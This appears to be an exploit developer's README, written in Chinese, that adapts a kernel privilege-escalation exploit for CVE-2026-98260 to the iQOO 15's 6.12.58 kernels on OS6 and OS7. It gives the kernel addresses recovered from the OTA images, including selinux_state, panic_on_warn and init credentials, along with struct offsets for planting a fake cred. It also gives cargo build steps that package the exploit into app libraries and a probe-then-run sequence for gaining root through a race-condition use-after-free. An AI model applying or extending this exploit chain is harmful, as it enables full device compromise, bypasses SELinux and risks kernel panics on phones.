# iQOO 15（V2505A）6.12.58 OS6/OS7 CVE-2026-98260 适配

在原有 **V2505A 链路**上新增一个 per-build profile；不是 6.12.69 的通用链。
保留 V2505A 的 vivo `vr.ko` 处理、SUSFS 和 Dynamic Switching 接线，只替换
6.12.58 这一版内核的常量。旧的 6.12.23 profile 保留。

## 状态

常量已从 iQOO 15 新 OS6 全量 OTA 的 `boot.img` 内核 Image 静态恢复，并用镜像
自带的 `.BTF` 校验了结构布局。**尚需真机验证**：先跑只读 `probe`，再跑完整 `run`。

## OTA 来源与提取

- 全量包：`https://sysuptxdl.vivo.com.cn/upgrade/oem/files/202609191407389358f1f6848008f94f1191ee74fa9588.zip`
  （原始链接中间的空格是复制问题；去掉后是 32 位 hash 文件名）
- 包大小：11,427,870,415 字节；`payload.bin` 是 **stored**，不需要下载整包。
- OTA metadata：`pre-device=canoe`、`hardware-device=PD2505MA`；
  `post-build=vivo/canoe/canoe:16/BP2A.250605.031.A3/compiler260919073041:user/release-keys`；
  `post-version=PD2505_A_16.0.30.14.W10.V000L1`；`post-sdk-level=36`（Android 16 / OS6）。
- 只按 HTTP Range 读取 ZIP 尾部/central directory、payload header/manifest 和
  `boot` 的三段数据；boot 操作类型 14 = `REPLACE_ZSTD`，三段合计约 13.6 MB，
  其余 96 MB 是解压后的 boot 镜像。
- `boot.img`：100,663,296 字节，SHA-256
  `b53767421fae5561fc2ef9358938ba9da61f88214a4c951563dfd44c54841c05`
- 内核 Image：41,306,624 字节（`boot.img[0x1000:]`），SHA-256
  `b3d9337983381b57e91eef5f58f237fad58f4bb0ec39b3cc306d5e3a24228355`
- release：`6.12.58-android16-6-g0a092cc0037a-abogki521987229-4k`

payload 细节：header 为 big-endian；本 OTA 的 partition 操作在 `PartitionUpdate`
字段 8（vendor 扩展）；boot 三段 `data_offset/data_length` 为
`810337/12097103`、`12907440/1494109`、`14401549/1079`，dst_extents 为
`(0,8192)`、`(8192,8192)`、`(16384,8192)`，block_size 4096；data blob 起点
`payload_data_start + 24 + 35140 + 267`。

## 复核记录

2026-11-10 用上述内核 Image 复核，`recover.py` 输出与本文件常量一致：

- kallsyms：`n=128878`、`names 0x14e3118..0x16d9edd`、`offsets 0x16dac58`、
  `relative_base 0xffffffc080000000`、0 逆序
- `do_timer_create=0xffffffc080517c0c`，BL `+0xa8`，site
  `0xffffffc080517cb8`（low21 `0x117cb8`）
- `copy_process=0xffffffc08018d8dc`，BL `+0x13c`，site
  `0xffffffc08018da1c`（low21 `0x18da1c`；本版 `dup_task_struct` 已内联）
- `__tracepoint_sys_exit=0xffffffc0826d9360`；`struct tracepoint` 0x50，
  `funcs` @ 0x48
- 静态地址与 BTF 见下节

## 目标

- 机型：iQOO 15（V2505A），OS6 / Android 16
- 内核：`6.12.58-android16-6-g0a092cc0037a-abogki521987229-4k`
- KMI：`android16-6.12`（沿用 V2505A 链的默认值）

## 常量

```c
#define TARGET_KERNEL_RELEASE      "6.12.58-android16-6-g0a092cc0037a-abogki521987229-4k"

/* do_timer_create+0xa8 -> site */
#define STATIC_TIMER_SITE          0xffffffc080517cb8ULL
#define TIMER_SITE_LOW21           0x117cb8ULL

/* copy_process+0x140 -> site */
#define COPY_PROCESS_LOW21         0x18da1cULL

/* kallsyms 链接期地址 */
#define SELINUX_STATE_STATIC       0xffffffc0827c6520ULL
#define PANIC_ON_WARN_STATIC       0xffffffc08252afe0ULL
#define SYS_EXIT_TRACEPOINT_STATIC 0xffffffc0826d9360ULL
#define TRACEPOINT_FUNCS_OFF       0x48ULL
#define ROOT_USER_STATIC           0xffffffc082552948ULL
#define INIT_USER_NS_STATIC        0xffffffc0825526d0ULL
#define INIT_UCOUNTS_STATIC        0xffffffc0825542e0ULL
#define INIT_GROUPS_STATIC         0xffffffc082553e10ULL
```

共享 slab/结构偏移与旧 V2505A 相同：

```text
TIMER_ALLOC 0x100
CRED_REQ 0xb8 / CRED_ALLOC 0xc0 / CRED_UID_OFF 0x8
OFF_TASK_CRED 0x900
TASK_ALLOC_BYTES 0x1440 / padded 0x1640
```

结构布局（BTF 实测）：

| 对象 | 值 |
| --- | --- |
| `struct k_itimer` | 0x100，`it`（rb node）@ 0x78 |
| `struct cred` | 0xb8；uid/gid @ 0x8，security @ 0x80，user @ 0x88，user_ns @ 0x90，ucounts @ 0x98，group_info @ 0xa0 |
| `struct task_struct` | 0x1440；`cred` @ 0x900 |
| `struct selinux_state` | 0x80，`enforcing` @ 0x0 |
| `struct task_security_struct` | 0x18；exec_sid @ 0x8，create_sid @ 0xc |
| `struct tracepoint` | 0x50；`funcs` @ 0x48 |

fake cred 的写入布局（C plant）：`security +0x80`、`user +0x88`、
`user_ns +0x90`、`ucounts +0x98`、`group_info +0xa0`；`uid` 在 `+0x8`。
与旧 V2505A 完全一致。

## 恢复方法（可复现）

```bash
python3 recover.py kernel.bin      # kernel.bin = boot.img[0x1000 : 0x1000+kernel_size]
```

脚本会扫描 `kmem_cache_alloc`/`_noprof` 两套命名，输出
`__tracepoint_sys_exit` 和 `tracepoint.funcs`，并校验 BTF header。本版
`dup_task_struct` 没有独立符号，任务分配点在 `copy_process+0x140`。

## 与旧 V2505A（6.12.23）的差异

- 目标/KMI：`6.12.23-android16-5` → `6.12.58-android16-6`；KMI 从
  android16-5 变为 android16-6。V2505A 链的 `ksud late-load` 默认
  `android16-6.12` 正好匹配新 KMI。
- timer site：`0x1e0890` → `0x117cb8`（`do_timer_create` 从 +0xac 变为 +0xa8 的
  返回地址）。
- 任务分配点：`dup_task_struct+0x54`（独立函数）→ `copy_process+0x140`
  （本版内联）；low21 从 `0x0cfd98` 变为 `0x18da1c`。
- `vr.ko` tracepoint：地址从 `0x82594840` 变为 `0x826d9360`；`funcs` 偏移仍为
  `0x48`，处理逻辑不变。
- 静态地址：`selinux_state`、`panic_on_warn`、`root_user`、`init_user_ns`、
  `init_ucounts`、`init_groups` 按新内核替换。
- 共享结构尺寸完全相同（k_itimer 0x100、task_struct 0x1440、`task->cred` 0x900、
  cred 0xb8、tracepoint 0x48），所以 C 侧扫描/fake cred 代码不需要改。
- 扩展能力沿用 V2505A 链：SUSFS 使用 `libsusfs_guard_lkm_612.so`，
  Dynamic Switching 使用现有 6.12 通用 loader/KO；新内核是 android16-6，
  比旧 V2505A 的 android16-5 更接近现有 6.12 模块，但仍需真机确认。

## OS7 6.12.58（第二份 6.12.58 build）

- 全量包：`https://sysuptxdl.vivo.com.cn/upgrade/oem/files/20261105053543df3dbd6f98071b0e38d9df5dab52b2b5.zip`
- 包大小：11,975,446,095 字节；`payload.bin` 是 stored。
- OTA metadata：`vivo/canoe/canoe:17/CP2A.260605.016/261104205930:user/release-keys`；
  `post-version=PD2505_A_17.1.10.9.W10.V000L1`；`post-sdk-level=37`
  （Android 17 / OS7）；`hardware-device=PD2505MA`。
- boot 三段同样是 type 14 ZSTD：`data_offset/data_length` 为
  `887854/12099921`、`12987775/1494350`、`14482125/1079`，dst_extents
  `(0,8192)`、`(8192,8192)`、`(16384,8192)`。
- `boot.img`：100,663,296 字节，SHA-256
  `4557237b4eb31b31f62513fa9ac49c3090ff204230239359a97e55b44abc2a5f`
- 内核 Image：41,306,624 字节，SHA-256
  `fe2c8afae654d8b4f31bd4fe3c35ea9f642387b0fd191e8f83a1bf207f0c7337`
- release：`6.12.58-android16-6-gdd6fd5c98918-abogki543627742-4k`

### OS7 常量

```c
#define TARGET_KERNEL_RELEASE      "6.12.58-android16-6-gdd6fd5c98918-abogki543627742-4k"

#define STATIC_TIMER_SITE          0xffffffc0805173e4ULL
#define TIMER_SITE_LOW21           0x1173e4ULL
#define COPY_PROCESS_LOW21         0x1f2218ULL
#define SELINUX_STATE_STATIC       0xffffffc0827c6520ULL
#define PANIC_ON_WARN_STATIC       0xffffffc08252afe0ULL
#define SYS_EXIT_TRACEPOINT_STATIC 0xffffffc0826d93e0ULL
#define TRACEPOINT_FUNCS_OFF       0x48ULL
#define ROOT_USER_STATIC           0xffffffc082552958ULL
#define INIT_USER_NS_STATIC        0xffffffc0825526e0ULL
#define INIT_UCOUNTS_STATIC        0xffffffc0825542f0ULL
#define INIT_GROUPS_STATIC         0xffffffc082553e20ULL
```

BTF/共享尺寸与 OS6 相同：k_itimer 0x100、task_struct 0x1440、`task->cred`
0x900、cred 0xb8、tracepoint 0x50/funcs 0x48。`selinux_state` 和
`panic_on_warn` 静态地址也与 OS6 相同；`root_user`/`init_*` 各 +0x10。

### OS6 → OS7 的差异

- 完整 release/build 不同；都是 6.12.58 android16-6。
- timer site：`0x117cb8` → `0x1173e4`；copy site：`0x18da1c` → `0x1f2218`。
- vr.ko tracepoint：`0x826d9360` → `0x826d93e0`；funcs 偏移仍 `0x48`。
- root_user/init_user_ns/init_ucounts/init_groups 各 +0x10；selinux/panic 不变。
- 共享结构尺寸、V2505A 链、SUSFS/通用切换、`rooted`/burst 修复全部复用。

> OS7 内核的 kallsyms offsets 数组相对 relative_base 有 4 字节 pad；本目录的
> `recover.py` 已改为在 base 附近扫描单调 s32 offsets 数组，OS6/OS7 都能复算。

## 构建

```bash
cd exploit/rust-t61269
cargo build --release --target aarch64-linux-android --features v2505a_61258
cp target/aarch64-linux-android/release/t61269 \
   ../../app/app/src/main/jniLibs/arm64-v8a/libv2505a_61258.so

cargo build --release --target aarch64-linux-android --features v2505a_61258_os7
cp target/aarch64-linux-android/release/t61269 \
   ../../app/app/src/main/jniLibs/arm64-v8a/libv2505a_61258_os7.so
```

`build.rs` 分别追加 `-DV2505A_61258` / `-DV2505A_61258_OS7`，
`Cargo.toml` 对应 `v2505a_61258 = []` / `v2505a_61258_os7 = []`。

## App 侧

- `ExploitKind.CVE2505A_61258("CVE-2026-98260-vivo-V2505A-6.12.58")`，按完整
  OS6 release 精确选中；入口 `libv2505a_61258.so`
- `ExploitKind.CVE2505A_61258_OS7("CVE-2026-98260-vivo-V2505A-6.12.58-OS7")`，
  按完整 OS7 release 精确选中；入口 `libv2505a_61258_os7.so`
- 旧的 6.12.23 V2505A 入口保留，按各自完整内核版本选择
- SUSFS / Dynamic Switching 与旧 V2505A 一致；VFS 仍只对 6.18 开放

## 验证顺序

1. 只读自检：
   - OS6：`libv2505a_61258.so probe` → `low21=0x117cb8` / `0x18da1c`
   - OS7：`libv2505a_61258_os7.so probe` → `low21=0x1173e4` / `0x1f2218`
   - 两者都期望 `PROBE_SLIDE ... aligned=1`、`PROBE_LINEAR_MAP`、`PROBE_CRED`、
     `PROBE_VR_TRACEPOINT=0x... funcs=0x... off=0x48`、`PROBE_OK`
2. 完整链路：对应 `.so run`，关注 `PLANT_CRED_OK` / `PARKED=1` /
   `MODULE_LOADED`
3. 冷重启后再跑一次；再验证 SUSFS 与 Dynamic Switching
4. 失败一律留 holder（`t61269-hold`），**同 boot 不要强行重跑**，冷重启再试

## 鲁棒性修正

- child report：如果 fake cred 的 task->cred 写入比 child 首次读 uid 晚，初始
  euid 可能仍是 2000；只要 `setuid(0)=0` 且 `resuid=0/0/0`，就按已取得 root
  处理，继续 late-load。
- burst miss：selinux 等 zero-write 的页面 burst 未命中后保留 holder，但不再
  用同一个 held zombie 原样重试；失败后走新一轮/冷重启。

## 限制

- 新内核是 android16-6；SUSFS/通用 KO 的兼容性按 V2505A 链复用，
  需真机确认。
- 竞态 UAF 本身可能导致 panic/重启；仅用于自有设备。
